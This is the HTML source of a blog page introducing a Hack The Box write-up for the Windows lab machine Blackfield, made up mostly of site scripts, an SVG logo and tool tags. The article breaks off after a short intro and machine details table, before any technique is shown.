<!DOCTYPE html><html lang="en">
  <head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Hackthebox Blackfiled - D3c0deZ3r0</title>

<meta name="description" content="Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine Iâ€™...">
<link rel="canonical" href="http://localhost:4000/hackthebox/retired/2020/07/11/Blackfield.html"><link rel="alternate" type="application/rss+xml" title="D3c0deZ3r0" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet -->




<link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
      <div class="header__title">
        <div class="header__brand"><?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="488.000000pt" height="490.000000pt" viewBox="0 0 488.000000 490.000000"
 preserveAspectRatio="xMidYMid meet">

<g transform="translate(0.000000,490.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M2352 4791 c-69 -26 -171 -82 -247 -136 -143 -102 -210 -182 -263
-316 -17 -41 -57 -135 -91 -209 -108 -241 -106 -301 14 -490 19 -30 31 -58 27
-62 -9 -9 -276 -123 -467 -200 -82 -33 -166 -68 -185 -78 -62 -32 -129 -109
-172 -199 -22 -46 -43 -79 -48 -75 -22 25 -134 242 -171 332 -23 56 -46 102
-51 102 -4 0 -6 -10 -4 -22 3 -13 22 -135 42 -273 39 -270 42 -280 99 -270 16
3 149 21 295 40 458 59 888 87 1340 87 425 0 654 -16 1289 -93 185 -22 338
-36 342 -32 5 5 14 36 20 68 13 73 68 489 64 493 -1 1 -13 -23 -25 -55 -36
-90 -113 -241 -163 -318 l-46 -70 -10 28 c-61 159 -130 234 -266 287 -116 45
-580 242 -587 248 -4 4 16 43 44 87 59 91 78 147 78 219 0 63 -23 127 -135
380 -76 172 -95 206 -144 259 -77 83 -193 167 -315 228 -123 61 -183 70 -264
40z m216 -156 c71 -36 108 -65 81 -65 -8 0 -49 7 -92 15 -139 27 -243 -16
-313 -130 -10 -16 -35 -51 -56 -76 -21 -25 -38 -48 -38 -51 0 -3 57 -9 126
-13 69 -4 122 -11 117 -15 -4 -5 -74 -29 -154 -54 -81 -26 -158 -55 -172 -66
-23 -18 -40 -53 -31 -63 3 -2 48 4 102 13 135 25 282 30 282 10 0 -17 -42 -33
-133 -51 -90 -18 -146 -44 -131 -59 5 -5 114 -4 244 2 174 8 265 8 350 -1 188
-18 181 -26 -23 -26 -246 -1 -408 -25 -646 -97 -129 -40 -171 -73 -171 -137 0
-48 32 -132 85 -222 34 -59 35 -62 10 -39 -85 78 -175 248 -182 345 -5 57 -1
71 67 240 40 99 86 206 103 238 59 112 236 275 345 318 77 30 147 25 230 -16z
m-89 -932 c22 -74 22 -78 4 -91 -22 -16 -78 -9 -103 13 -15 14 -18 14 -30 0
-10 -12 -10 -21 -2 -40 7 -14 16 -25 22 -25 6 0 8 -4 5 -10 -12 -20 -63 -10
-101 21 -85 67 -88 62 -22 -28 51 -69 66 -77 148 -69 36 4 74 4 83 0 31 -12
17 -24 -28 -24 -51 0 -52 -3 -34 -76 6 -25 9 -47 6 -50 -3 -4 -31 6 -62 20
-77 35 -164 125 -209 218 -40 80 -57 148 -37 148 63 0 261 35 286 50 17 10 35
19 40 19 6 1 21 -34 34 -76z m250 10 l24 -6 -24 -13 c-41 -23 -110 -17 -144
12 l-30 25 75 -6 c41 -3 86 -9 99 -12z m-855 -239 c18 -18 213 -248 236 -279
16 -20 -178 110 -263 177 -54 42 -80 47 -116 19 l-25 -19 53 -71 c30 -40 51
-74 48 -77 -3 -4 -39 14 -79 39 -40 25 -84 48 -98 52 -42 10 -291 -84 -338
-128 -33 -30 -48 -62 -62 -131 -11 -53 -13 -57 -28 -43 -9 9 -17 40 -20 71 -2
31 -9 56 -14 56 -6 0 -22 -8 -36 -18 -51 -35 -52 -35 -41 -3 23 66 67 93 322
196 133 55 283 116 332 137 104 43 108 43 129 22z m1474 -110 c169 -70 324
-135 344 -145 33 -17 98 -102 86 -114 -2 -2 -26 12 -54 32 -27 19 -85 52 -129
73 -92 44 -383 150 -410 150 -10 0 -50 -25 -90 -55 -39 -30 -75 -55 -79 -55
-4 0 13 26 37 58 61 80 61 81 41 103 -22 25 -55 24 -105 -2 -23 -11 -43 -19
-45 -16 -6 6 76 97 87 97 6 0 148 -57 317 -126z"/>
<path d="M2105 2961 c-49 -4 -101 -12 -115 -18 -46 -20 -79 -67 -139 -203 -52
-115 -61 -144 -61 -193 0 -67 8 -87 103 -244 93 -153 99 -157 262 -161 143 -4
180 4 195 43 10 27 -2 74 -23 87 -7 4 -67 8 -134 8 l-121 0 -72 123 c-56 97
-70 128 -66 152 2 17 29 83 59 146 l54 116 129 6 c124 6 130 8 152 33 25 29
24 66 -3 93 -17 18 -95 22 -220 12z"/>
<path d="M2594 2961 c-12 -5 -25 -18 -29 -28 -4 -10 -10 -182 -12 -383 -5
-399 -6 -394 52 -406 22 -4 38 0 55 14 23 19 25 28 30 132 l5 112 149 -137
c139 -128 150 -136 184 -133 44 4 69 39 58 81 -4 17 -67 83 -176 183 l-170
157 53 39 c28 22 116 84 193 139 78 55 145 106 148 115 25 65 -32 118 -97 90
-18 -7 -99 -61 -181 -120 -81 -58 -150 -106 -152 -106 -3 0 -3 49 -2 110 2 87
0 112 -12 124 -19 20 -69 28 -96 17z"/>
<path d="M3356 2889 c-8 -48 -76 -729 -76 -759 l0 -25 223 -30 c122 -16 237
-29 256 -29 40 1 61 24 61 69 0 55 -21 64 -209 89 -94 13 -173 25 -176 27 -2
2 2 47 8 99 11 83 14 95 31 93 10 -1 49 -4 87 -8 60 -6 69 -5 88 14 12 12 21
34 21 51 0 48 -29 68 -108 76 -38 3 -75 9 -81 13 -11 7 4 180 17 192 4 3 81
-4 172 -17 91 -13 179 -23 196 -23 76 -2 90 111 16 133 -20 6 -355 52 -454 62
l-67 7 -5 -34z"/>
<path d="M1224 2880 c-12 -4 -24 -16 -28 -26 -9 -25 -59 -333 -92 -568 l-27
-199 28 -24 c20 -18 35 -23 54 -18 40 9 58 38 71 114 13 78 9 76 139 87 l66 5
32 -70 c24 -54 37 -72 57 -77 39 -9 75 3 88 31 13 29 11 34 -115 330 -121 284
-174 398 -194 413 -19 14 -48 15 -79 2z m134 -491 c-7 -5 -32 -9 -54 -9 l-41
0 13 83 c8 45 14 87 15 92 0 6 19 -28 40 -74 31 -65 37 -86 27 -92z"/>
<path d="M4154 2797 c-7 -19 -144 -739 -144 -758 0 -44 97 -73 124 -37 7 9 27
90 46 180 18 90 36 169 40 176 6 12 82 -151 171 -368 32 -79 45 -92 93 -88 34
2 43 8 55 32 13 28 10 38 -58 205 -91 220 -89 216 -65 207 78 -30 182 -10 227
44 35 41 60 150 47 200 -13 49 -49 93 -95 114 -20 10 -118 35 -218 57 -100 21
-190 41 -200 43 -10 3 -20 -1 -23 -7z m284 -192 c52 -13 98 -27 104 -33 11
-11 -6 -87 -23 -97 -7 -5 -249 41 -266 50 -2 1 3 27 9 58 l12 57 36 -6 c19 -4
77 -17 128 -29z"/>
<path d="M663 2789 c-55 -16 -57 -34 -28 -182 14 -73 28 -139 31 -148 3 -12
-20 -21 -123 -43 -71 -15 -132 -28 -138 -27 -5 0 -25 62 -43 137 -18 76 -40
146 -49 156 -29 33 -106 17 -123 -26 -7 -18 12 -104 81 -371 49 -191 94 -355
99 -365 12 -23 37 -29 78 -18 54 14 57 36 22 183 -17 72 -33 137 -35 146 -4
13 17 21 112 42 111 26 153 32 153 23 0 -8 51 -252 56 -269 3 -10 16 -25 29
-33 35 -23 92 -3 102 34 4 16 -17 150 -56 352 -77 404 -75 394 -106 408 -14 7
-27 12 -28 11 -1 0 -17 -5 -34 -10z"/>
<path d="M2050 2069 c-545 -22 -1030 -81 -1605 -196 -181 -36 -334 -69 -338
-73 -12 -11 9 -47 38 -66 15 -9 190 -46 432 -90 343 -63 411 -78 430 -96 13
-12 63 -85 111 -162 97 -158 200 -299 297 -411 36 -41 65 -79 65 -85 0 -6 -79
-148 -175 -317 -150 -263 -175 -313 -175 -349 0 -27 7 -51 21 -68 47 -59 -32
-56 1291 -56 1185 0 1214 1 1245 20 87 53 85 119 -9 276 -58 97 -236 411 -267
472 -11 21 -6 31 62 110 132 156 236 301 346 485 29 48 62 92 73 98 11 6 136
31 277 55 388 66 548 102 582 132 16 13 29 27 29 31 0 16 -78 41 -215 70 -837
179 -1689 253 -2515 220z m1265 -134 l25 -24 0 -490 0 -490 -24 -28 -24 -28
-852 0 -852 0 -24 28 -24 28 0 485 0 486 29 29 29 29 847 0 846 0 24 -25z
m-14 -1085 c48 -14 76 -46 149 -180 35 -63 103 -185 152 -270 97 -169 106
-203 58 -227 -20 -10 -280 -13 -1221 -13 -1195 0 -1196 0 -1223 21 -14 11 -26
30 -26 41 0 26 326 600 348 613 9 6 26 13 37 17 34 10 1686 9 1726 -2z"/>
<path d="M1627 1873 c-4 -3 -7 -210 -7 -460 l0 -453 820 0 820 0 0 460 0 460
-813 0 c-448 0 -817 -3 -820 -7z m1163 -463 l0 -350 -350 0 -350 0 0 350 0
350 350 0 350 0 0 -350z"/>
<path d="M2106 1740 c-2 -3 -2 -153 -2 -335 l1 -330 335 0 335 0 0 334 0 334
-333 1 c-184 1 -335 -1 -336 -4z m436 -85 c3 -4 2 -25 -3 -48 -20 -94 -15 -87
-68 -87 l-50 0 -14 63 c-8 34 -12 65 -10 70 5 8 137 10 145 2z m-24 -177 c-3
-20 -9 -23 -48 -23 -39 0 -45 3 -48 23 -3 20 0 22 48 22 48 0 51 -2 48 -22z
m-211 -49 c21 -8 24 -14 21 -56 l-3 -47 -60 -13 c-33 -7 -63 -12 -67 -13 -5 0
-8 34 -8 76 l0 76 47 -7 c25 -4 57 -11 70 -16z m83 -39 c0 -22 1 -43 3 -47 1
-5 -10 -9 -25 -11 -27 -3 -28 -1 -28 41 0 48 5 57 32 57 14 0 18 -8 18 -40z
m90 15 c18 -21 -16 -61 -37 -44 -16 14 -17 31 -1 47 16 16 23 15 38 -3z m70
-40 c11 -13 8 -21 -20 -50 -32 -33 -35 -34 -52 -18 -18 16 -17 18 14 50 36 38
41 39 58 18z m120 -85 l25 -19 -50 -51 c-27 -27 -54 -50 -60 -50 -5 0 -25 26
-44 56 l-33 56 33 34 32 33 36 -20 c20 -11 47 -29 61 -39z"/>
<path d="M1600 800 c-30 -30 -24 -40 26 -40 55 0 84 14 84 40 0 17 -7 20 -45
20 -32 0 -51 -6 -65 -20z"/>
<path d="M1746 804 c-22 -22 -20 -33 8 -40 37 -9 78 -1 90 19 8 14 8 20 -4 27
-23 15 -77 12 -94 -6z"/>
<path d="M1897 813 c-12 -3 -17 -12 -15 -26 3 -19 11 -22 51 -25 42 -3 48 0
56 20 7 19 5 24 -13 30 -24 7 -54 8 -79 1z"/>
<path d="M2035 804 c-24 -25 -13 -39 34 -42 45 -3 74 12 69 36 -4 22 -82 26
-103 6z"/>
<path d="M2320 805 c-25 -30 -4 -46 52 -43 45 3 53 6 56 24 2 15 -4 23 -20 28
-39 10 -75 7 -88 -9z"/>
<path d="M2478 813 c-11 -3 -18 -14 -18 -29 0 -22 3 -24 55 -24 46 0 55 3 55
18 0 36 -36 50 -92 35z"/>
<path d="M2618 813 c-43 -11 -10 -53 42 -53 50 0 65 12 51 39 -12 21 -47 26
-93 14z"/>
<path d="M2758 813 c-21 -5 -21 -8 -8 -34 14 -25 97 -28 107 -3 12 32 -42 52
-99 37z"/>
<path d="M2907 813 c-12 -3 -17 -12 -15 -26 3 -20 9 -22 58 -22 49 0 55 2 52
20 -6 32 -40 42 -95 28z"/>
<path d="M3030 807 c0 -37 64 -58 114 -38 19 7 19 8 -2 29 -26 26 -112 32
-112 9z"/>
<path d="M3187 812 c-16 -7 -16 -9 -2 -30 13 -17 26 -22 60 -22 51 0 60 9 39
38 -15 22 -59 28 -97 14z"/>
<path d="M2167 790 c-6 -23 20 -33 74 -28 26 2 35 8 37 26 3 20 0 22 -51 22
-46 0 -55 -3 -60 -20z"/>
<path d="M1560 729 c-10 -17 -9 -23 1 -30 23 -15 87 -10 104 7 25 26 12 39
-43 42 -44 3 -52 0 -62 -19z"/>
<path d="M1709 729 c-14 -27 1 -39 53 -39 38 0 68 20 68 46 0 10 -14 14 -55
14 -45 0 -56 -4 -66 -21z"/>
<path d="M1859 729 c-15 -28 1 -39 58 -39 32 0 45 5 53 20 16 30 4 40 -50 40
-40 0 -51 -4 -61 -21z"/>
<path d="M2011 731 c-16 -29 -15 -29 33 -36 59 -9 88 1 84 28 -3 19 -10 22
-55 25 -43 3 -54 0 -62 -17z"/>
<path d="M2160 741 c0 -5 -3 -16 -6 -25 -5 -14 4 -16 60 -16 64 0 66 1 66 25
0 24 -3 25 -60 25 -33 0 -60 -4 -60 -9z"/>
<path d="M2311 736 c-21 -25 -3 -36 60 -36 57 0 60 1 57 23 -3 19 -10 22 -54
25 -36 2 -54 -1 -63 -12z"/>
<path d="M2460 725 c0 -24 3 -25 60 -25 57 0 60 1 60 25 0 24 -3 25 -60 25
-57 0 -60 -1 -60 -25z"/>
<path d="M2610 725 c0 -24 2 -25 61 -25 57 0 60 1 57 23 -3 19 -10 22 -60 25
-56 3 -58 2 -58 -23z"/>
<path d="M2758 745 c-3 -3 -4 -15 -1 -26 7 -24 41 -33 89 -25 29 6 35 11 32
29 -3 19 -10 22 -58 25 -31 2 -59 0 -62 -3z"/>
<path d="M2908 744 c-12 -11 5 -44 26 -49 11 -2 30 -6 41 -8 12 -3 7 -5 -12
-6 -38 -1 -48 -13 -33 -41 9 -16 21 -20 66 -20 52 0 55 2 52 22 -2 12 -14 28
-27 34 -21 11 -21 13 -6 21 14 8 15 14 6 32 -10 17 -21 21 -60 21 -26 0 -50
-3 -53 -6z"/>
<path d="M3056 741 c-10 -16 6 -41 30 -47 33 -8 94 4 94 19 0 7 -5 18 -12 25
-14 14 -104 16 -112 3z"/>
<path d="M3206 741 c-12 -18 32 -51 67 -51 45 0 65 15 51 37 -12 20 -108 31
-118 14z"/>
<path d="M1527 662 c-30 -33 -21 -42 43 -42 56 0 61 2 70 26 6 14 10 27 10 30
0 2 -24 4 -53 4 -40 0 -58 -5 -70 -18z"/>
<path d="M1680 661 c-19 -37 -13 -42 53 -39 59 3 62 4 65 31 3 27 2 27 -52 27
-44 0 -57 -4 -66 -19z"/>
<path d="M1842 668 c-7 -7 -12 -20 -12 -30 0 -14 9 -18 38 -19 l37 -2 -43 -7
c-45 -7 -62 -21 -62 -53 0 -16 8 -18 61 -15 69 3 94 22 72 56 -9 15 -7 21 8
30 10 7 19 21 19 32 0 17 -7 20 -53 20 -29 0 -58 -5 -65 -12z"/>
<path d="M1990 666 c0 -8 -3 -21 -6 -30 -5 -14 4 -16 60 -16 50 0 66 3 66 14
0 8 3 21 6 30 5 14 -4 16 -60 16 -50 0 -66 -3 -66 -14z"/>
<path d="M2146 664 c-15 -39 -8 -44 59 -44 l65 0 0 30 c0 30 0 30 -59 30 -44
0 -60 -4 -65 -16z"/>
<path d="M2300 650 l0 -30 60 0 60 0 0 30 0 30 -60 0 -60 0 0 -30z"/>
<path d="M2460 650 c0 -30 0 -30 58 -30 32 0 61 2 64 5 3 3 3 17 0 30 -4 23
-8 25 -63 25 -59 0 -59 0 -59 -30z"/>
<path d="M2612 653 c3 -27 5 -28 66 -31 l63 -3 -3 28 c-3 27 -5 28 -66 31
l-63 3 3 -28z"/>
<path d="M2770 650 l0 -30 65 0 c67 0 74 5 59 44 -5 12 -21 16 -65 16 -59 0
-59 0 -59 -30z"/>
<path d="M3080 669 c0 -21 21 -49 38 -49 15 -1 16 -2 1 -13 -22 -17 -8 -53 27
-69 25 -12 26 -13 6 -18 -19 -5 -20 -7 -7 -37 13 -31 17 -33 64 -33 64 0 80 7
74 31 -7 27 -41 49 -78 50 -30 2 -29 2 5 8 28 5 34 10 32 26 -6 31 -22 45 -56
46 -30 2 -30 2 -3 6 29 5 37 29 15 51 -15 15 -118 16 -118 1z"/>
<path d="M3237 659 c3 -11 17 -27 30 -36 17 -12 21 -18 12 -24 -10 -6 -10 -13
-1 -33 11 -24 17 -26 72 -26 65 0 72 8 44 48 -10 15 -26 22 -52 24 -37 1 -37
1 -4 5 34 5 38 13 22 44 -9 15 -22 19 -69 19 -55 0 -59 -2 -54 -21z"/>
<path d="M1486 588 c-29 -41 -21 -48 49 -48 61 0 65 1 71 26 8 33 -7 44 -63
44 -32 0 -46 -5 -57 -22z"/>
<path d="M1658 599 c-10 -5 -18 -21 -18 -34 0 -24 3 -25 60 -25 56 0 61 2 71
27 7 20 6 28 -3 35 -18 11 -89 9 -110 -3z"/>
<path d="M1982 598 c-5 -7 -12 -22 -14 -33 -3 -18 3 -20 62 -20 l65 0 3 33 3
32 -54 0 c-32 0 -59 -5 -65 -12z"/>
<path d="M2142 598 c-7 -7 -12 -22 -12 -35 0 -22 4 -23 65 -23 57 0 65 2 65
19 0 11 3 26 6 35 5 14 -3 16 -53 16 -33 0 -64 -5 -71 -12z"/>
<path d="M2633 603 c-7 -2 -13 -18 -13 -34 l0 -29 65 0 c61 0 65 1 65 23 0 13
-5 28 -12 35 -12 12 -81 15 -105 5z"/>
<path d="M2791 601 c-18 -11 2 -49 32 -60 26 -10 85 -3 93 11 3 5 -2 20 -10
33 -13 20 -25 25 -59 25 -23 0 -48 -4 -56 -9z"/>
<path d="M2947 603 c-9 -15 12 -52 35 -64 23 -13 23 -13 2 -18 -18 -5 -19 -10
-12 -38 9 -33 9 -33 73 -33 56 0 65 3 65 18 0 29 -23 53 -60 62 l-35 8 33 1
c25 1 32 5 32 20 0 33 -28 51 -80 51 -27 0 -51 -3 -53 -7z"/>
<path d="M2292 573 c3 -27 6 -28 66 -31 l62 -3 0 31 0 30 -66 0 -65 0 3 -27z"/>
<path d="M2460 570 l0 -30 65 0 65 0 0 30 0 30 -65 0 -65 0 0 -30z"/>
<path d="M1462 524 c-11 -5 -42 -55 -42 -69 0 -3 30 -5 67 -3 61 3 69 5 82 30
9 15 12 30 8 34 -9 9 -98 15 -115 8z"/>
<path d="M1620 510 c-11 -11 -20 -29 -20 -40 0 -19 5 -21 62 -18 56 3 64 6 77
30 9 15 13 29 11 31 -3 2 -28 7 -57 11 -45 6 -55 4 -73 -14z"/>
<path d="M1789 509 c-11 -11 -19 -28 -19 -39 0 -18 7 -20 60 -20 52 0 62 3 76
25 24 36 14 46 -45 50 -42 2 -58 -2 -72 -16z"/>
<path d="M3324 523 c-17 -3 -21 -9 -16 -26 9 -40 22 -47 89 -47 62 0 64 1 57
23 -15 52 -51 66 -130 50z"/>
<path d="M1946 498 c-12 -46 -9 -48 59 -48 61 0 66 2 75 26 16 42 13 44 -59
44 -63 0 -69 -2 -75 -22z"/>
<path d="M2116 498 c-12 -46 -9 -48 63 -48 63 0 69 2 75 23 12 45 9 47 -63 47
-63 0 -69 -2 -75 -22z"/>
<path d="M2288 490 c-3 -17 -2 -32 0 -35 3 -3 34 -5 69 -5 l63 0 0 35 0 35
-64 0 c-63 0 -64 0 -68 -30z"/>
<path d="M2462 488 l3 -33 68 -3 68 -3 -3 33 -3 33 -68 3 -68 3 3 -33z"/>
<path d="M2629 488 c7 -33 7 -33 74 -36 61 -3 67 -1 67 17 0 45 -9 51 -80 51
l-67 0 6 -32z"/>
<path d="M2796 493 c10 -43 11 -43 80 -43 56 0 64 2 64 19 0 45 -9 51 -81 51
l-69 0 6 -27z"/>
<path d="M2197 393 c-3 -5 -8 -41 -12 -80 l-7 -73 262 0 263 0 -7 71 c-3 39
-9 75 -12 80 -6 11 -481 12 -487 2z"/>
</g>
</svg>
<a title="Cyber-Sec blogs, HackTheBox writeup's, Tryhackme writeup's, Vulnhub witeup's, Portfolio.
" href="/">D3c0deZ3r0</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/archive.html">Archive</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="/Machines.html">Machines</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Hackthebox Blackfiled</h1></header><span class="split-space">&nbsp;</span>
          <a class="edit-on-github"
            title="Edit on Github"
            href="https://github.com/user_name/repo_name/tree/master/_posts/2020-07-11-Blackfield.md">
            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="Hackthebox Blackfiled"><div class="article__info clearfix"><ul class="left-col menu"><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=windows">windows</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=activedirectory">activedirectory</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=evilwinrm">evilwinrm</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=smb">smb</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=rpcclient">rpcclient</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=mimikatz">mimikatz</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=lsass">lsass</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=impacket">impacket</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive.html?tag=hashcat">hashcat</a>
            </li></ul><ul class="right-col menu"><li><i class="fas fa-user"></i> <span>Jeevan</span></li><li><i class="far fa-calendar-alt"></i> <span>Jul 11, 2020</span>
            </li></ul></div><meta itemprop="author" content="Jeevan"/><meta itemprop="datePublished" content="2020-07-11T21:50:00+05:30">
    <meta itemprop="keywords" content="windows,activedirectory,evilwinrm,smb,rpcclient,mimikatz,lsass,impacket,hashcat"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><p><img src="/assets/img/sample/blackfield/blackfield.png" alt="" /></p>

<blockquote>
  <p>Blackfiled is a HTB active machine at present. This is completely based on enumeration which will lead our way in. This is one of the best windows machine Iâ€™ve enjoyed doing it.</p>
</blockquote>

<table>
  <thead>
    <tr>
      <th>Blackfield</th>
      <th>Â </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS:</td>
      <td>Windows</td>
    </tr>
    <tr>
      <td>Difficulty:</td>
      <td>Hard</td>
    </tr>
    <tr>
      <td>Points:</td>
      <td>40</td>
    </tr>
    <tr>
      <td>Release:</td>
      <td>06 Jun 2020</td>
    </tr>
    <tr>
      <td>IP:</td>
      <td>10.10.10.192</td>
    </tr>
  </tbody>
</table>

<h2 id="lets-start-hacking-into-blackfiled">letâ€™s start hacking into <code class="language-plaintext highlighter-rouge">blackfiled</code></h2>

